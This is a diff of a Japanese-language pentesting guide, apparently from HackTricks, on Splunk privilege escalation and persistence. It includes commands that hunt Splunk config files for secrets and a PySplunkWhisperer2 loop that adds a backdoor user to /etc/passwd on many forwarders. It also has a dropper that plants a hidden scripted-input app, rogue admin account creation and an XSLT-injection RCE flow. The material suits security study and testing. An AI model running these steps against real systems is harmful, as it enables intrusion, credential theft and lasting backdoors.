@@ -1,20 +1,18 @@
 # Splunk LPE and Persistence
 
-{{#include ../../banners/hacktricks-training.md}}
+**internally** または **externally** にマシンを **enumerating** している際に **Splunk running**（通常、Web UI は **8000**、management API は **8089**）を発見した場合、有効な credentials は、app installation、scripted inputs、management actions を通じて **code execution** に利用できることがよくあります。<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk が **root** として動作している場合、これによって即座に **privilege escalation** が可能になることがよくあります。<sup>[[1]](#references)</sup>
 
-マシンを**内部**または**外部**から**enumerating**していて、**Splunk が稼働中**（通常、Web UI は **8000**、management API は **8089**）であることが分かった場合、有効な認証情報から、app のインストール、scripted inputs、management actions を通じて**コード実行**につなげられることがよくあります。Splunk が **root** として稼働している場合、これは頻繁に即時の**権限昇格**につながります。
-
-generic なリモート攻撃対象領域、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。
+generic な remote attack surface、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。
 
 {{#ref}}
 ../../network-services-pentesting/8089-splunkd.md
 {{#endref}}
 
-すでに **root** で、Splunk service が localhost のみで listen していない場合は、**Splunk password hashes** の窃取、**encrypted secrets** の復元、または**悪意のある app** の push によって、ローカルまたは複数の forwarder にわたる persistence を維持することもできます。
+すでに **root** で、Splunk service が localhost のみに listen していない場合は、**Splunk password hashes** の steal、**encrypted secrets** の recover、または **malicious app** の push によって、ローカルまたは複数の forwarder にわたって persistence を維持することもできます。<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>
 
-## 興味深いローカルファイル
+## Interesting Local Files
 
-Splunk または Splunk Universal Forwarder が稼働している host に侵入した場合、通常、以下の path が最も興味深いものです。
+Splunk または Splunk Universal Forwarder が動作している host にアクセスした場合、通常、以下の paths が最も興味深いものです。<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
 ```bash
 export SPLUNK_HOME=/opt/splunk
 [ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder
@@ -23,53 +21,55 @@ find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf
 
 grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
 ```
-重要なアーティファクト:
+重要なartifact:
 
-- **`$SPLUNK_HOME/etc/passwd`**: ローカルのSplunkユーザーとパスワードハッシュ。
-- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の`.conf`ファイルに保存されたsecretをSplunkが暗号化するために使用するキー。
-- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期adminのbootstrapファイル。gold imageやprovisioningのミスで有用。`etc/passwd`がすでに存在する場合は無視される。
-- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputsが有効化されることが多い場所。
-- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent appを隠したり、すでに配布されているものを確認したりするのに適した場所。
+- **`$SPLUNK_HOME/etc/passwd`**: ローカルのSplunkユーザーとpassword hash。<sup>[[7]](#references)</sup>
+- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の`.conf`ファイルに保存されたsecretのencryptにSplunkが使用するkey。<sup>[[8]](#references)</sup>
+- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期admin bootstrapファイル。gold imageやprovisioningのミスで有用。`etc/passwd`がすでに存在する場合は無視される。<sup>[[9]](#references)</sup>
+- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputが有効化されることの多い場所。<sup>[[10]](#references)</sup>
+- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent appを隠したり、すでにdistributionされている内容を確認したりするのに適した場所。<sup>[[11]](#references)</sup>
 
-## Splunk Universal Forwarder Agent Exploitの概要
+## Splunk Universal Forwarder Agent Exploit Summary
 
-詳細については、[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を参照してください。これは単なる概要です:<sup>[[1]](#references)</sup>
+詳細については[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を確認してください。ここではsummaryのみを示します。<sup>[[1]](#references)</sup>
 
-**Exploitの概要:**
-Splunk Universal Forwarder（UF）を標的とするexploitにより、**agent password**を持つ攻撃者は、agentが動作しているシステム上で任意のコードを実行できます。これにより、環境の大部分が侵害される可能性があります。
+**Exploit overview:**
+Splunk Universal Forwarder（UF）を標的とするexploitにより、**agent password**を持つ攻撃者は、agentが稼働しているシステム上で任意のcodeを実行でき、環境の大部分がcompromiseされる可能性があります。<sup>[[1]](#references)</sup>
 
-**動作する理由:**
+**Why it works:**
 
-- UFのmanagement serviceは、通常**TCP 8089**で公開されています。
-- 攻撃者はAPIにauthenticateし、forwarderに**malicious app bundle**をinstallするよう指示できます。
-- 同じprimitiveを、ローカルでは**LPE**、リモートでは**RCE**に使用できます。
-- **SplunkWhisperer2**などのpublic toolingはapp bundleを自動的に作成し、Linux target向けにpayloadを適応させることができます。
+- UF management serviceは通常、**TCP 8089**で公開されています。<sup>[[6]](#references)</sup>
+- 攻撃者はAPIにauthenticateし、forwarderに**malicious app bundle**をinstallするよう指示できます。<sup>[[1]](#references)[[5]](#references)</sup>
+- 同じprimitiveを、localでは**LPE**に、remoteでは**RCE**に利用できます。<sup>[[5]](#references)</sup>
+- **SplunkWhisperer2**などのpublic toolingはapp bundleを自動的に作成し、Linux target向けにpayloadを適応できます。<sup>[[5]](#references)</sup>
 
-**passwordをrecoverする一般的な方法:**
+**Common ways to recover the password:**
 
-- documentation、script、share、deployment automationに残されたcleartext credentials。
-- `$SPLUNK_HOME/etc/passwd`内のpassword hashを取得し、offline crackingを行う。
-- `user-seed.conf`などのgolden imageやprovisioningの残骸。
+- documentation、script、share、deployment automation内のcleartext credentials。<sup>[[1]](#references)</sup>
+- `$SPLUNK_HOME/etc/passwd`内のpassword hashを取得し、offline crackingを行う。<sup>[[1]](#references)[[7]](#references)</sup>
+- `user-seed.conf`などのgold imageやprovisioningの残骸。<sup>[[1]](#references)[[9]](#references)</sup>
 
-**影響:**
+**Impact:**
 
-- 侵害された各host上でのSYSTEM/root-level code execution。
-- persistent app、backdoor、またはransomwareのdeploy。
-- dataがforwardされる前にtelemetryをdisableまたはtamper。
+- compromiseされた各host上でのSYSTEM/root-level code execution。<sup>[[1]](#references)</sup>
+- persistent app、backdoor、またはransomwareのdeployment。<sup>[[1]](#references)</sup>
+- dataがforwardされる前にtelemetryをdisableまたはtamperすること。<sup>[[1]](#references)</sup>
 
-**Exploitの実行例:**
+**Example command for exploitation:**
+
+元のreportでは、複数のforwarderにpayloadを送信するために、以下のloopを使用しています。<sup>[[1]](#references)</sup>
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**利用可能な公開 exploit:**
+**利用可能な公開exploit:**
 
 - [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
 - [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
 - [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)
 
-## Scripted Inputs または Malicious Apps による Persistence
+## Scripted Inputs または Malicious Apps によるPersistence
 
-`root`/`splunk` として **filesystem write access** がある場合、または認証済みアクセスによって apps を install できる場合、非常に信頼性の高い Persistence の手法は、**scripted input** を含む **custom app** を配置することです。<sup>[[2]](#references)</sup> Splunk 自身のドキュメントでは、scripted inputs は app directory 配下に配置し、`inputs.conf` から有効化することが想定されています。
+`root`/`splunk` として **filesystem write access** がある場合、または apps のインストールに対する認証済みアクセスがある場合、非常に信頼性の高いPersistenceメカニズムは、**scripted input** を含む **custom app** を配置することです。<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk 自身のドキュメントでは、scripted inputs は app directory 配下に配置し、`inputs.conf` から有効化することが想定されています。<sup>[[10]](#references)</sup>
 
 一般的な構成:
 ```bash
@@ -77,14 +77,14 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 ├── bin/check.sh
 └── default/inputs.conf
 ```
-最小限の `inputs.conf`:
+最小限の `inputs.conf`:<sup>[[10]](#references)</sup>
 ```ini
 [script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
 disabled = 0
 interval = 60
 sourcetype = auditd
 ```
-簡易 Linux dropper:
+Quick Linux dropper（文書化された app layout を使用）:<sup>[[10]](#references)</sup>
 ```bash
 APP="$SPLUNK_HOME/etc/apps/.linux_audit"
 mkdir -p "$APP/bin" "$APP/default"
@@ -93,72 +93,80 @@ printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0
 chmod +x "$APP/bin/check.sh"
 "$SPLUNK_HOME/bin/splunk" restart
 ```
-メモ:
+Notes:
 
-- 同じ trick は、`/opt/splunkforwarder/etc/apps/` を使用する **Universal Forwarder** でも機能します。
-- Attackers は、明らかに malicious な app を作成する代わりに、正規の add-on を変更して紛れ込むことがよくあります。
-- **deployment server** では、`deployment-apps/` 内に malicious app を仕込むと **fleet-wide persistence** につながります。これは、forwarders が更新された app を poll して download し、適用時に再起動することが多いためです。
+- 同じ手法は、`/opt/splunkforwarder/etc/apps/` を使用する **Universal Forwarder** でも機能します。<sup>[[2]](#references)[[10]](#references)</sup>
+- Attackers は、明らかに悪意のある app を作成する代わりに、正規の add-on を変更して紛れ込むことがよくあります。<sup>[[2]](#references)</sup>
+- **deployment server** では、悪意のある app を `deployment-apps/` 内に配置すると、forwarder が polling して更新された app を download し、適用のために restart することが多いため、**fleet-wide persistence** につながります。<sup>[[11]](#references)[[12]](#references)</sup>
 
 ## Credential Theft and Admin Takeover
 
-Splunk の local files を読み取れる場合、通常は **Splunk admin access** の回復と **encrypted service credentials** の回復という、2 つの有力な目標があります。
+Splunk の local files を読み取れる場合、通常は **Splunk admin access** の回復と、**encrypted service credentials** の回復という2つの有力な目標があります。<sup>[[8]](#references)</sup>
 
 ### Password hashes and local users
 
-Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、この file を crack することで、web UI と management API で使用できる credentials を回復できます。
+Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、この file を cracking することで、web UI と management API に対する有効な credentials を回復できます。<sup>[[1]](#references)[[7]](#references)</sup>
 
-すでに有効な **admin** credentials を持っており、Splunk が **native** authentication backend を使用している場合、CLI 自体を persistence に使用できます。
+すでに有効な **admin** credentials を持っており、Splunk が **native** authentication backend を使用している場合、CLI 自体を persistence に利用できます。<sup>[[13]](#references)</sup>
 ```bash
 "$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
 "$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
 ```
 ### `splunk.secret` と暗号化された値
 
-Splunk は、複数の設定ファイルに保存される機密値を保護するために `etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル**の両方を盗み出せれば、以下の値を復元または再利用できる場合があります。
+Splunk は、複数の設定ファイルに保存される機密値を保護するために `etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル** の両方を盗める場合、以下の値を復元または再利用できることがあります:<sup>[[8]](#references)</sup>
 
-- `pass4SymmKey` などの forwarder/indexer 間の shared secret
-- `sslPassword` などの TLS private-key password
-- `bindDNPassword` などの LDAP bind credential
+- `pass4SymmKey` などの forwarder/indexer shared secrets
+- `sslPassword` などの TLS private-key passwords
+- `bindDNPassword` などの LDAP bind credentials
 
-これは、Splunk admin password 自体を crack できない場合でも、**lateral movement** に有用です。
+これにより、Splunk admin password 自体を crack できない場合でも、**lateral movement** が可能になります。<sup>[[8]](#references)</sup>
 
 ### `user-seed.conf` の悪用
 
-`user-seed.conf` は、初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため、稼働中の box ではあまり有用ではありませんが、以下の環境では非常に興味深い対象になります。
+`user-seed.conf` は初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため、稼働中の box ではあまり有用ではありませんが、以下の環境では非常に興味深い対象になります:<sup>[[9]](#references)</sup>
 
-- 侵害された installation template
-- container image
-- unattended provisioning workflow
-- Splunk が自動的に再初期化される appliance
+- compromised installation templates
+- container images
+- unattended provisioning workflows
+- Splunk が自動的に再初期化される appliances
 
-このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、redeployment 後に admin access を静かに取り戻せます。
+このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、再デプロイ後に admin access を静かに取り戻せます。<sup>[[9]](#references)</sup>
 
 ## Splunk Queries の悪用
 
 詳細については [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>
 
-最近有用な technique の 1 つは、脆弱な Splunk Enterprise version において **user-supplied XSLT** を悪用し、low-privileged な authenticated account を **OS command execution** が可能な `splunk` user へ昇格させることです。
+最近の有用な technique の1つは、脆弱な Splunk Enterprise versions において **user-supplied XSLT** を悪用し、low-privileged authenticated account を `splunk` user としての **OS command execution** に変えることです。<sup>[[3]](#references)[[4]](#references)</sup>
 
-High-level flow:
+High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>
 
-1. Splunk に authenticate する。
-2. preview/upload functionality を通じて malicious **XSL** file を upload する。
-3. upload した stylesheet を **dispatch** directory から使用して、Splunk に search result を render させる。
-4. XSLT payload を使用して file を書き込むか、Splunk の search pipeline を通じて execution を trigger する（たとえば `runshellscript` などの internal functionality に到達する）。
+1. Splunk に Authenticate する。
+2. preview/upload functionality を介して malicious **XSL** file を Upload する。
+3. Splunk に、**dispatch** directory にある upload 済み stylesheet を使用して search results を render させる。
+4. XSLT payload を使用して file を write するか、Splunk の search pipeline を介して execution を trigger する（たとえば `runshellscript` などの internal functionality に到達する）。
 
-重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** であることです。Linux では通常、**`splunk`** account での access になります。この user は application tree の所有者であることが多く、secret を読み取り、shell を失った後も存続する persistent app を仕込めるため、それでも価値があります。
+重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** であることです。Linux では通常、**`splunk`** account として access を得ます。この user は application tree を所有していることが多く、secrets を read でき、shell を失っても survive する persistent apps を plant できるため、依然として valuable です。<sup>[[3]](#references)[[4]](#references)</sup>
 
-exploitation 中に使用される representative path は次のとおりです：
+Exploitation 中に使用される representative path は以下のとおりです:<sup>[[4]](#references)</sup>
 ```text
 /opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
 ```
 Splunk が過剰な権限で実行されている場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service unit、あるいは不適切な `sudo` ルールにアクセスできる場合、これは容易な **LPE** chain になります。
 
-## 参考資料
+## References
 
-- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
-- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
+- [1] [Splunk Forwarders の悪用による RCE と Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+- [2] [TraitorWare に注意: Persistence のための Splunk の利用](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
 - [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
 - [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
-
+- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
+- [6] [デフォルト値の変更](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
+- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
+- [8] [複数のサーバーに secure password をデプロイする](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
+- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
+- [10] [scripted input の設定](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
+- [11] [deployment apps の作成](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
+- [12] [deployment updates の仕組み](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
+- [13] [CLI を使用した users の設定](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
 {{#include ../../banners/hacktricks-training.md}}
